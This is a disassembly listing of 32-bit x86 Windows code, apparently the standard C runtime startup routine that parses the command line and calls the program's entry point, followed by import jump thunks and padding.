  40fdbc:	83 0d 1c 5c 41 00 ff 	orl    $0xffffffff,0x415c1c
  40fdc3:	83 0d 20 5c 41 00 ff 	orl    $0xffffffff,0x415c20
  40fdca:	ff 15 14 03 41 00    	call   *0x410314
  40fdd0:	8b 0d 14 5c 41 00    	mov    0x415c14,%ecx
  40fdd6:	89 08                	mov    %ecx,(%eax)
  40fdd8:	ff 15 18 03 41 00    	call   *0x410318
  40fdde:	8b 0d 10 5c 41 00    	mov    0x415c10,%ecx
  40fde4:	89 08                	mov    %ecx,(%eax)
  40fde6:	a1 1c 03 41 00       	mov    0x41031c,%eax
  40fdeb:	8b 00                	mov    (%eax),%eax
  40fded:	a3 18 5c 41 00       	mov    %eax,0x415c18
  40fdf2:	e8 1c 01 00 00       	call   0x40ff13
  40fdf7:	39 1d 50 51 41 00    	cmp    %ebx,0x415150
  40fdfd:	75 0c                	jne    0x40fe0b
  40fdff:	68 10 ff 40 00       	push   $0x40ff10
  40fe04:	ff 15 20 03 41 00    	call   *0x410320
  40fe0a:	59                   	pop    %ecx
  40fe0b:	e8 ee 00 00 00       	call   0x40fefe
  40fe10:	68 a8 50 41 00       	push   $0x4150a8
  40fe15:	68 a4 50 41 00       	push   $0x4150a4
  40fe1a:	e8 d9 00 00 00       	call   0x40fef8
  40fe1f:	a1 0c 5c 41 00       	mov    0x415c0c,%eax
  40fe24:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40fe27:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40fe2a:	50                   	push   %eax
  40fe2b:	ff 35 08 5c 41 00    	push   0x415c08
  40fe31:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40fe34:	50                   	push   %eax
  40fe35:	8d 45 90             	lea    -0x70(%ebp),%eax
  40fe38:	50                   	push   %eax
  40fe39:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40fe3c:	50                   	push   %eax
  40fe3d:	ff 15 28 03 41 00    	call   *0x410328
  40fe43:	68 a0 50 41 00       	push   $0x4150a0
  40fe48:	68 00 50 41 00       	push   $0x415000
  40fe4d:	e8 a6 00 00 00       	call   0x40fef8
  40fe52:	83 c4 24             	add    $0x24,%esp
  40fe55:	a1 2c 03 41 00       	mov    0x41032c,%eax
  40fe5a:	8b 30                	mov    (%eax),%esi
  40fe5c:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40fe5f:	80 3e 22             	cmpb   $0x22,(%esi)
  40fe62:	75 3a                	jne    0x40fe9e
  40fe64:	46                   	inc    %esi
  40fe65:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40fe68:	8a 06                	mov    (%esi),%al
  40fe6a:	3a c3                	cmp    %bl,%al
  40fe6c:	74 04                	je     0x40fe72
  40fe6e:	3c 22                	cmp    $0x22,%al
  40fe70:	75 f2                	jne    0x40fe64
  40fe72:	80 3e 22             	cmpb   $0x22,(%esi)
  40fe75:	75 04                	jne    0x40fe7b
  40fe77:	46                   	inc    %esi
  40fe78:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40fe7b:	8a 06                	mov    (%esi),%al
  40fe7d:	3a c3                	cmp    %bl,%al
  40fe7f:	74 04                	je     0x40fe85
  40fe81:	3c 20                	cmp    $0x20,%al
  40fe83:	76 f2                	jbe    0x40fe77
  40fe85:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40fe88:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40fe8b:	50                   	push   %eax
  40fe8c:	ff 15 2c 01 41 00    	call   *0x41012c
  40fe92:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  40fe96:	74 11                	je     0x40fea9
  40fe98:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  40fe9c:	eb 0e                	jmp    0x40feac
  40fe9e:	80 3e 20             	cmpb   $0x20,(%esi)
  40fea1:	76 d8                	jbe    0x40fe7b
  40fea3:	46                   	inc    %esi
  40fea4:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40fea7:	eb f5                	jmp    0x40fe9e
  40fea9:	6a 0a                	push   $0xa
  40feab:	58                   	pop    %eax
  40feac:	50                   	push   %eax
  40fead:	56                   	push   %esi
  40feae:	53                   	push   %ebx
  40feaf:	53                   	push   %ebx
  40feb0:	ff 15 90 01 41 00    	call   *0x410190
  40feb6:	50                   	push   %eax
  40feb7:	e8 96 75 ff ff       	call   0x407452
  40febc:	89 45 98             	mov    %eax,-0x68(%ebp)
  40febf:	50                   	push   %eax
  40fec0:	ff 15 ac 03 41 00    	call   *0x4103ac
  40fec6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40fec9:	8b 08                	mov    (%eax),%ecx
  40fecb:	8b 09                	mov    (%ecx),%ecx
  40fecd:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  40fed0:	50                   	push   %eax
  40fed1:	51                   	push   %ecx
  40fed2:	e8 1b 00 00 00       	call   0x40fef2
  40fed7:	59                   	pop    %ecx
  40fed8:	59                   	pop    %ecx
  40fed9:	c3                   	ret
  40feda:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40fedd:	ff 75 88             	push   -0x78(%ebp)
  40fee0:	ff 15 34 03 41 00    	call   *0x410334
  40fee6:	ff 25 40 03 41 00    	jmp    *0x410340
  40feec:	ff 25 3c 03 41 00    	jmp    *0x41033c
  40fef2:	ff 25 30 03 41 00    	jmp    *0x410330
  40fef8:	ff 25 24 03 41 00    	jmp    *0x410324
  40fefe:	68 00 00 03 00       	push   $0x30000
  40ff03:	68 00 00 01 00       	push   $0x10000
  40ff08:	e8 07 00 00 00       	call   0x40ff14
  40ff0d:	59                   	pop    %ecx
  40ff0e:	59                   	pop    %ecx
  40ff0f:	c3                   	ret
  40ff10:	33 c0                	xor    %eax,%eax
  40ff12:	c3                   	ret
  40ff13:	c3                   	ret
  40ff14:	ff 25 0c 03 41 00    	jmp    *0x41030c
  40ff1a:	cc                   	int3
  40ff1b:	cc                   	int3
  40ff1c:	cc                   	int3
  40ff1d:	cc                   	int3
  40ff1e:	cc                   	int3
  40ff1f:	cc                   	int3
  40ff20:	ff 25 a8 04 41 00    	jmp    *0x4104a8
  40ff26:	ff 25 ac 04 41 00    	jmp    *0x4104ac
  40ff2c:	ff 25 c0 04 41 00    	jmp    *0x4104c0
  40ff32:	ff 25 b4 04 41 00    	jmp    *0x4104b4
  40ff38:	ff 25 b8 04 41 00    	jmp    *0x4104b8
  40ff3e:	ff 25 bc 04 41 00    	jmp    *0x4104bc
  40ff44:	ff 25 b0 04 41 00    	jmp    *0x4104b0
  40ff4a:	ff 25 a0 04 41 00    	jmp    *0x4104a0
  40ff50:	ff 25 a4 04 41 00    	jmp    *0x4104a4
  40ff56:	ff 25 f8 04 41 00    	jmp    *0x4104f8
  40ff5c:	ff 25 f0 04 41 00    	jmp    *0x4104f0
  40ff62:	ff 25 e8 04 41 00    	jmp    *0x4104e8
  40ff68:	ff 25 e4 04 41 00    	jmp    *0x4104e4
  40ff6e:	ff 25 e0 04 41 00    	jmp    *0x4104e0
  40ff74:	ff 25 c8 04 41 00    	jmp    *0x4104c8
  40ff7a:	ff 25 ec 04 41 00    	jmp    *0x4104ec
  40ff80:	ff 25 cc 04 41 00    	jmp    *0x4104cc
  40ff86:	ff 25 d0 04 41 00    	jmp    *0x4104d0
  40ff8c:	ff 25 d4 04 41 00    	jmp    *0x4104d4
  40ff92:	ff 25 d8 04 41 00    	jmp    *0x4104d8
  40ff98:	ff 25 dc 04 41 00    	jmp    *0x4104dc
  40ff9e:	cc                   	int3
  40ff9f:	cc                   	int3
  40ffa0:	b8 00 1a 41 00       	mov    $0x411a00,%eax
  40ffa5:	e9 2e fd ff ff       	jmp    0x40fcd8
  40ffaa:	cc                   	int3
  40ffab:	cc                   	int3
  40ffac:	b8 90 1a 41 00       	mov    $0x411a90,%eax
  40ffb1:	e9 22 fd ff ff       	jmp    0x40fcd8
  40ffb6:	cc                   	int3
  40ffb7:	cc                   	int3
  40ffb8:	b8 e8 1a 41 00       	mov    $0x411ae8,%eax
  40ffbd:	e9 16 fd ff ff       	jmp    0x40fcd8
  40ffc2:	cc                   	int3
  40ffc3:	cc                   	int3
  40ffc4:	b8 40 1b 41 00       	mov    $0x411b40,%eax
  40ffc9:	e9 0a fd ff ff       	jmp    0x40fcd8
  40ffce:	cc                   	int3
  40ffcf:	cc                   	int3
  40ffd0:	b8 98 1b 41 00       	mov    $0x411b98,%eax
  40ffd5:	e9 fe fc ff ff       	jmp    0x40fcd8
